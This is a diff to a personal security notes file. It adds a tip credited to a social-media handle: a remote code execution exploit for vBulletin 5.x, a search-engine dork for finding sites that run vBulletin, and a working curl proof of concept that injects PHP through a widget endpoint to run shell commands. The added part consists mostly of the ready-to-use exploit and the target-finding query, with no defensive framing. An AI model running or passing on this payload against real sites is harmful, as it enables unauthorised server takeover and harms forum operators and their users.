@@ -1,5 +1,15 @@
 # notes 
 
+### then this @h4x0r_dz 
+0day RCE exploit on vBulletin 5xx
+
+dork ; intext:"Powered by vBulletin"
+
+POC
+````
+curl -s http://SITE/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo%20shell_exec("id"); exit;'
+````
+
 ### whoa there @Sambal0x (Richard Tan) with the beefiest threadzilla:
 Having trouble bypassing SSL-pinning on Android app? 
 
